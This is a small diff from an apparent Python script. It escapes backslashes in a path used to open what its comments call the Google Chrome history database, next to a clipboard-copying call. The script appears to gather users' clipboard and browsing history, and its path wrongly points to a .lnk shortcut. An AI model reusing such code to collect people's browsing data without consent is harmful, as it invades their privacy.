@@ -79,7 +79,7 @@ copy_clipboard()
 
 #get history of google chrome
 
-conn = sqlite3.connect("C:\Users\Public\Desktop\Google Chrome.lnk") #connect to the google chrome history database "add your path, I have used mine , you can use yours"
+conn = sqlite3.connect("C:\\Users\\Public\\Desktop\\Google Chrome.lnk") #connect to the google chrome history database "add your path, I have used mine , you can use yours"
 cursor = conn.cursor()
 
 # Retrieve search history from the database accordingly
